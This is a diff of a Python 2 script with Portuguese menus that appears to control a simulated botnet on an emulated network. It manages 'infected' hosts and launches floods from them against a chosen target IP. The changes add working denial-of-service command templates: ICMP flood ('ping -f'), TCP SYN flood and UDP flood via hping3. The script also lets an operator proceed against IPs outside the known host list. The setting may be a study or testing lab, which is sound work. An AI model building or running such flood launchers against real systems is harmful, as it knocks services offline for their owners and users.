@@ -24,7 +24,7 @@ def host_management_menu():
 
     while True:
         print "\n--- Gerenciamento de Hosts ---"
-        print "1. Listar todos os hosts (alvos)"
+        print "1. Listar hosts"
         print "2. Adicionar hosts (manual)"
         print "3. Adicionar N hosts aleatorios"
         print "4. Adicionar TODOS os hosts disponiveis"
@@ -41,17 +41,17 @@ def host_management_menu():
 
                 print "Hosts disponiveis na rede:"
                 for host_name, ip in sorted(available_hosts.items()):
-                    status = "(Controlado)" if host_name in controlled_hosts else "(Disponivel)"
-                    print "  - %s (IP: %s) %s" % (host_name, ip, status)
+                    status = "(controlado)" if host_name in controlled_hosts else "(não controlado)"
+                    print "  - %s ip: %s %s" % (host_name, ip, status)
 
         elif choice == '2':
             if not update_available_hosts(): continue
             infectable_hosts = [h for h in available_hosts.keys() if h not in controlled_hosts]
             if not infectable_hosts:
-                print "Nenhum host novo disponivel para 'infeccao'."
+                print "Nenhum host novo disponivel para 'infecção'."
                 continue
 
-            print "Hosts disponiveis para 'infeccao':"
+            print "Hosts disponiveis para 'infecção':"
             for h in sorted(infectable_hosts):
                 print "  - %s (IP: %s)" % (h, available_hosts[h])
             hosts_to_infect_input = raw_input("Digite os hosts para adicionar (separados por espaco, ex: h1 h2): ")
@@ -76,7 +76,7 @@ def host_management_menu():
             if not update_available_hosts(): continue
             infectable_hosts = [h for h in available_hosts.keys() if h not in controlled_hosts]
             if not infectable_hosts:
-                print "Nenhum host novo disponivel para 'infeccao'."
+                print "Nenhum host novo disponivel para 'infecção'."
                 continue
             try:
                 num_to_add_str = raw_input("Quantos hosts aleatorios adicionar? ")
@@ -99,7 +99,7 @@ def host_management_menu():
             if not update_available_hosts(): continue
             infectable_hosts = [h for h in available_hosts.keys() if h not in controlled_hosts]
             if not infectable_hosts:
-                print "Nenhum host novo disponivel para 'infeccao'. Todos ja estao controlados."
+                print "Nenhum host novo disponivel para 'infecção'. Todos ja estao controlados."
                 continue
             count = 0
             for host_name in infectable_hosts:
@@ -182,28 +182,54 @@ def launch_test_menu():
         return
 
     print "\n--- Lancar Teste de Trafego ---"
-    print "Alvos disponiveis:"
-    for host_name, ip in sorted(available_hosts.items()):
+    print "Alvos disponiveis (apenas hosts nao controlados):"
+
+    available_targets = {}
+    for host_name, ip in available_hosts.items():
+        if host_name not in controlled_hosts:
+            available_targets[host_name] = ip
+
+    if not available_targets:
+        print "Nenhum alvo disponivel. (Todos os hosts da rede ja estao sob seu controle)."
+        return
+
+    for host_name, ip in sorted(available_targets.items()):
         print "  - %s (IP: %s)" % (host_name, ip)
 
     target_ip = raw_input("Digite o IP do alvo (ex: 10.0.0.4): ")
 
-    if not any(ip == target_ip for ip in available_hosts.values()):
-        print "Aviso: O IP '%s' nao parece pertencer a um host conhecido." % target_ip
+    if not any(ip == target_ip for ip in available_targets.values()):
+        print "Aviso: O IP '%s' nao e um alvo valido ou pertence a um host controlado." % target_ip
         if raw_input("Deseja continuar mesmo assim? (s/n): ").lower() != 's':
             print "Teste cancelado."
             return
 
     print "\n--- Tipo de Trafego ---"
     print "1. Ping (ICMP Flood)"
-    print "2. iperf (TCP/UDP Flood - requer iperf instalado nos hosts)"
-    test_type = raw_input("Escolha (1-2): ")
-
+    print "2. hping3 (TCP SYN Flood)"
+    print "3. hping3 (UDP Flood)"
+    print "4. iperf (TCP/UDP Flood - requer iperf instalado nos hosts)"
+    test_type = raw_input("Escolha (1-4): ")
+    
     command_template = ""
     if test_type == '1':
         duration = raw_input("Duracao do ping em segundos (ex: 10): ")
-        command_template = "ping -w %s %s &" % (duration, target_ip)
+        command_template = "timeout %s ping -f %s &" % (duration, target_ip)
+        print "Nota: Usando 'ping -f' (flood). O 'timeout' ira parar."
+    
     elif test_type == '2':
+        duration = raw_input("Duracao do ataque em segundos (ex: 10): ")
+        port = raw_input("Porta alvo (ex: 80): ")
+        command_template = "timeout %s hping3 -S --flood -p %s %s &" % (duration, port, target_ip)
+        print "Nota: 'hping3' deve estar instalado nos hosts (apt-get install hping3)."
+
+    elif test_type == '3':
+        duration = raw_input("Duracao do ataque em segundos (ex: 10): ")
+        port = raw_input("Porta alvo (ex: 53): ")
+        command_template = "timeout %s hping3 --udp --flood -p %s %s &" % (duration, port, target_ip)
+        print "Nota: 'hping3' deve estar instalado nos hosts (apt-get install hping3)."
+
+    elif test_type == '4':
         duration = raw_input("Duracao do iperf em segundos (ex: 10): ")
         command_template = "iperf -c %s -t %s &" % (target_ip, duration)
     else:
